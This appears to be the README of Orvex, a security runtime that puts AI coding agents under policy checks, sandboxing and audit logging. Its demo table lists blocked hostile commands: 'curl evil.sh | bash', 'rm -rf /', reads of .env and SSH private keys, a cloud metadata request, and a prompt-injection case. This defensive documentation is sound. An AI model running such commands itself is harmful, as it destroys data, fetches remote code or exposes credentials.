<p align="center">
  <img src="docs/assets/banner.svg" alt="ORVEX — Autonomous Agent Security Runtime" width="100%">
</p>

<p align="center">
  <img src="docs/assets/logo.svg" width="60" alt="Orvex Mark">
</p>

<p align="center">
  <strong>The Security Runtime &amp; Control Plane for Autonomous AI Agents.</strong><br>
  Run coding agents, terminal bots, and background workers without giving them unrestricted access to your machine.
</p>

<p align="center">
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-FFFFFF?style=flat-square&labelColor=000000" alt="Apache-2.0"></a>
  <a href="docs/threat-model.md"><img src="https://img.shields.io/badge/telemetry-none-FFFFFF?style=flat-square&labelColor=000000" alt="No telemetry"></a>
  <a href="docs/sandbox.md"><img src="https://img.shields.io/badge/isolation-honest%20reporting-FFFFFF?style=flat-square&labelColor=000000" alt="Honest isolation"></a>
  <a href="https://www.npmjs.com/package/orvex"><img src="https://img.shields.io/badge/npm-v0.1.0-FFFFFF?style=flat-square&labelColor=000000" alt="npm version"></a>
  <img src="https://img.shields.io/badge/local--first-127.0.0.1-FFFFFF?style=flat-square&labelColor=000000" alt="Local first">
</p>

```bash
npm install -g orvex-cli
orvex init --profile balanced
orvex run claude
```

> **Give your AI agent enough power to be useful — but never more power than you explicitly permit.**

Developed by **[Ansh Rajore](https://github.com/anshrajore)** · Dark Arcane · Nashik · Full-Stack & AI Systems.

---

<p align="center">
  <img src="docs/assets/compare.svg" alt="Raw agent versus Orvex" width="100%">
</p>

## What Orvex Is

Orvex is a **local-first security control plane** that sits between an autonomous agent and the operating system. File access, process execution, network connections, secrets, MCP tools, and Git all pass through policy, composite risk scoring, approval, and audit.

It is **not** a chatbot, **not** an agent clone, and **not** a mock sandbox. It is defense-in-depth: **Declarative Policy + Composite Risk Engine + Interactive Human Approval + Real OS Isolation + Append-Only Flight Recorder**.

<p align="center">
  <img src="docs/assets/architecture.svg" alt="Orvex architecture" width="100%">
</p>

```text
Agent → Orvex Runtime → Policy Engine → Risk Engine → Decision Gate → OS Sandbox → SARIF Audit Log
```

<p align="center">
  <img src="docs/assets/decisions.svg" alt="ALLOW ASK BLOCK ESCALATE" width="100%">
</p>

---

## Quick Demo (Real Engine Decisions)

```bash
# Clone & install dependencies
pnpm install
pnpm build

# Run interactive acceptance demo
node apps/cli/dist/index.js demo
```

<p align="center">
  <img src="docs/assets/flight-recorder.svg" alt="Flight recorder sample" width="100%">
</p>

| Action | Target Resource | Decision | Reason |
|:---|:---|:---:|:---|
| `FILE_READ` | `README.md` | **ALLOW** | Matches project documentation whitelist |
| `FILE_WRITE` | `src/index.ts` | **ALLOW** | Within allowed working directory bounds |
| `PROCESS_EXEC` | `npm test` | **ALLOW** | Whitelisted test process |
| `FILE_READ` | `.env` | **BLOCK** | Environment secrets protected by default-deny |
| `FILE_READ` | `~/.ssh/id_rsa` | **BLOCK** | User private keys and credentials protected |
| `NETWORK` | `github.com:443` | **ALLOW** | Whitelisted domain endpoint |
| `NETWORK` | `169.254.169.254` | **BLOCK** | Cloud instance metadata endpoint blocked |
| `PROCESS_EXEC` | `curl evil.sh \| bash` | **BLOCK** | Command AST detected remote chained shell |
| `PROCESS_EXEC` | `rm -rf /` | **BLOCK** | Catastrophic root destruction intercepted |
| `GIT_PUSH` | `origin main --force` | **ASK** | Protected branch requires human confirmation |
| `MCP_CALL` | `untrusted_mcp.run` | **BLOCK** | MCP server trust level is unknown or restricted |
| `PROMPT_INJECT` | Untrusted PR body | **ESCALATE** | Heuristics flagged instruction override attempt |

---

## Core Capabilities

1. **Zero-Trust Policy Engine**: Declarative YAML rules with 5 profiles (`relaxed`, `balanced`, `strict`, `paranoid`, `ci`).
2. **Composite Risk Scoring**: Mathematical multi-factor 0–100 scoring with behavioral baseline anomaly detection.
3. **OS-Level Sandboxing**: macOS Seatbelt `sandbox-exec` dynamic profiles, Linux `bubblewrap` (bwrap), and Docker container isolation.
4. **Secret Vault & Redaction**: Real-time detection & redaction for AWS keys, GitHub PATs, OpenAI/Anthropic keys, JWTs, and SSH private keys.
5. **Command AST Analyzer**: Parses pipeline graphs, flagging chained interpreters (`curl | bash`), destructive recursive deletes, and subshell escapes.
6. **Git Security**: Enforces branch locks (`main`, `master`, `release/*`) and flags destructive commands (`reset --hard`, force push).
7. **MCP Tool Governance**: Inspects Model Context Protocol tool arguments for hidden file traversal and enforces server trust boundaries.
8. **SHA-256 Checkpoints**: Snapshot and instant rollback of workspace file states.
9. **SARIF Flight Recorder**: Append-only NDJSON audit logs with SARIF 2.1.0 export for GitHub Code Scanning and CI/CD pipelines.
10. **Interactive CLI & Web Console**: Terminal UI with approval prompts + local React dashboard with WebSocket event streaming.

---

## CLI Reference

```bash
# Initialisation & diagnostics
orvex init [--profile balanced]      # Generate .orvex.yml
orvex doctor                          # Report platform & sandbox isolation strengths
orvex demo                            # Run 12-scenario engine simulation

# Running agents under protection
orvex run claude                      # Anthropic Claude Code
orvex run openclaw                    # OpenClaw agent
orvex run codex                       # OpenAI Codex CLI
orvex run gemini                      # Google Gemini CLI
orvex run opencode                    # OpenCode
orvex run -- ./my-agent               # Universal executable launcher

# Policy validation & testing
orvex policy validate                 # Check syntax and rule conflicts
orvex policy test                     # Run matrix test simulations

# Secrets & Flight Recorder
orvex secrets scan .env               # Scan for secrets without revealing values
orvex session history                 # List previous execution sessions
orvex session replay ses_f7b84ef6     # Replay audit trail in terminal or Markdown
orvex audit export --format sarif     # Export SARIF 2.1.0 for CI/CD
orvex checkpoint create               # Take a cryptographic file tree snapshot
orvex rollback <session-id>          # Revert the latest snapshot for a session
orvex dashboard                       # Launch local web console (127.0.0.1:4173)
```

**Exit Codes:** `0` Success · `1` Policy Violation · `2` Blocked Incursion · `3` Security Error · `4` Config Error · `5` Sandbox Unavailable · `6` Approval Denied.

## Using Orvex From the Terminal

### 1. Install and initialize

Use the published CLI package:

```bash
npm install --global orvex-cli
orvex version
cd path/to/your-project
orvex init --profile balanced
```

For a source checkout, install the workspace dependencies and build first:

```bash
pnpm install
pnpm build
node apps/cli/dist/index.js init --profile balanced
```

`orvex init` creates `.orvex.yml` in the current project. The project policy
is loaded together with the global configuration at
`~/.config/orvex/config.yml`; project rules apply only to that working
directory.

### 2. Inspect the host before running an agent

```bash
orvex doctor
orvex agents list
orvex policy validate
orvex policy test
```

`doctor` reports the actual sandbox provider and strength. A `WEAK` fallback
means policy evaluation and monitoring are active, but kernel isolation is not.
Do not treat a weak fallback as equivalent to Docker, Bubblewrap, or Seatbelt.

### 3. Run a supported agent

```bash
orvex run claude
orvex run openclaw
orvex run codex
orvex run gemini
orvex run opencode
```

Arguments after `--` go to the underlying agent:

```bash
orvex run claude -- --model sonnet
orvex run codex -- --full-auto
```

Agent flags never override Orvex policy. A dangerous flag can change the
agent's behavior, but Orvex still evaluates filesystem, process, network,
secret, MCP, and Git actions.

### 4. Run any executable

Generic mode works with a local executable or a command found on `PATH`:

```bash
orvex run -- ./my-agent
orvex run -- ./my-agent --project ./demo
orvex run -- python3 agent.py
```

Use dry-run to inspect the launch boundary without starting the agent:

```bash
orvex run --dry-run -- ./my-agent
```

The generic adapter provides the platform's available sandbox and filtered
environment. It cannot infer tool calls made through an opaque application,
so use an agent adapter or MCP integration when one is available.

### 5. Configure permissions

Edit `.orvex.yml` to grant only the project capabilities the agent needs:

```yaml
version: 1
profile: balanced

filesystem:
  default: deny
  read:
    allow:
      - ./src/**
      - ./README.md
      - ./package.json
  write:
    allow:
      - ./src/**
      - ./tests/**
  delete:
    default: deny

process:
  default: deny
  allow:
    - node
    - npm
    - git

network:
  default: deny
  allow:
    - github.com:443
    - registry.npmjs.org:443

secrets:
  default: deny

mcp:
  default: deny
```

Validate and simulate changes before launching:

```bash
orvex policy validate
orvex policy test
```

Rules are default-deny for the balanced profile. Secret paths such as `.env`,
`~/.ssh`, cloud credentials, private keys, and system directories remain
protected even if a broad project glob would otherwise match them.

### 6. Choose approval behavior

```bash
orvex run claude --approval-mode ask
orvex run claude --approval-mode strict
orvex run claude --approval-mode auto
```

`ask` requests human approval for policy decisions marked `ASK`. `strict`
denies those decisions in non-interactive runs. `auto` can approve an ASK
decision, but it cannot override a hard deny or a critical command guard.
Use `--profile ci` for unattended pipelines; CI has no interactive prompts and
resolves approval requests as denies.

### 7. Review sessions and audit output

Every session creates local, redacted records under `~/.orvex/`:

```bash
orvex session list
orvex session show <session-id>
orvex session history
orvex session replay <session-id>
orvex session export <session-id> --format markdown
orvex audit export --format ndjson > audit.ndjson
orvex audit export --format sarif > orvex.sarif
```

Use JSON output for automation:

```bash
orvex --json session list
orvex --json secrets scan .env
```

Raw secret values, authorization headers, cookies, tokens, and private keys
are redacted before persistence. Audit data stays local unless you explicitly
export it.

### 8. Checkpoints and rollback

Create a snapshot before a large autonomous change:

```bash
orvex checkpoint create
orvex checkpoint list
orvex rollback <session-id>
```

Rollback refuses to overwrite a file that changed after the checkpoint. Review
the refusal and resolve the file manually rather than losing independent work.

### 9. Run the local dashboard

Build the dashboard and bind it to loopback:

```bash
pnpm --filter @anshrajore/orvex-dashboard build
orvex dashboard
orvex dashboard --port 4174
```

Open `http://127.0.0.1:4173` or the selected port. The dashboard polls a
bounded live event window and never exposes a public listener by default.

### 10. Use Orvex in CI

CI mode is non-interactive and fail-closed for approval requests:

```bash
orvex run --profile ci -- ./my-agent
orvex ci
orvex audit export --format sarif > orvex.sarif
```

Use the process exit code to fail a job on a policy violation. Keep the
workspace policy in version control and review changes like source code.

### Security boundary

Orvex is defense in depth, not a guarantee that an agent is safe. Sandbox
strength varies by operating system, network allowlists depend on the selected
backend, and prompt-injection detection is heuristic. An agent started
outside `orvex run` is outside Orvex's protection boundary. Run `orvex doctor`
on every target host and read the limitations in `docs/sandbox.md` and
`docs/threat-model.md` before enabling unattended execution.

---

## Supported Agent Adapters

| Adapter | Command | Description |
|:---|:---|:---|
| **Claude Code** | `orvex run claude` | Full argument pass-through to Anthropic's Claude Code |
| **OpenClaw** | `orvex run openclaw` | Isolated runtime for OpenClaw coding sessions |
| **Codex CLI** | `orvex run codex` | Zero-trust wrapper for OpenAI Codex |
| **Gemini CLI** | `orvex run gemini` | Sandboxed execution for Google Gemini CLI |
| **OpenCode** | `orvex run opencode` | Strict environment for OpenCode workflows |
| **Generic Binary** | `orvex run -- ./agent` | Universal launcher for Python, Node, Go, or custom binaries |

---

## Sandbox Strength & Honesty

| Platform | Provider | Reported Strength | Mechanism |
|:---|:---|:---:|:---|
| **Linux** | Bubblewrap (`bwrap`) | **STRONG** | Unshares PID, IPC, Network; Read-only system binds |
| **macOS** | Seatbelt (`sandbox-exec`) | **MODERATE** | Dynamic Scheme (`.sb`) profile generation |
| **Cross-platform** | Docker Container | **STRONG** | Ephemeral containerized execution |
| **All** | In-Process Monitor | **WEAK** | Policy + AST checks + audit only |

> Running `orvex doctor` truthfully reports the exact strength of your environment. Orvex never pretends an in-process wrapper is a kernel jail.

---

## TypeScript SDK

Integrate Orvex security checks directly into your agent frameworks:

```typescript
import { Orvex } from '@anshrajore/orvex-sdk';

const runtime = await new Orvex({
  policy: './.orvex.yml',
  profile: 'strict',
}).start();

// Evaluate actions programmatically
const decision = await runtime.evaluate({
  capability: 'filesystem.read',
  target: './src/index.ts',
});

if (decision.verdict === 'allow') {
  // Execute safely
}
```

---

## Privacy & Telemetry

- **Zero Telemetry**: No tracking, no external pings, no cloud accounts.
- **Local-First**: All audit logs, sessions, and credentials stay in `~/.orvex`.
- **Local Bindings**: The dashboard and live API strictly bind to `127.0.0.1`.

---

## Development

```bash
pnpm install
pnpm typecheck
pnpm lint
pnpm test
pnpm test:integration
pnpm test:security
pnpm test:adversarial
pnpm build
```

---

## Author & Attribution

Developed by **[Ansh Rajore](https://github.com/anshrajore)** at **Dark Arcane**, Nashik.

- **GitHub**: [@anshrajore](https://github.com/anshrajore)
- **Repository**: [Orvex-Autonomous-Agent-Security-Runtime](https://github.com/anshrajore/Orvex-Autonomous-Agent-Security-Runtime)
- **License**: Apache-2.0
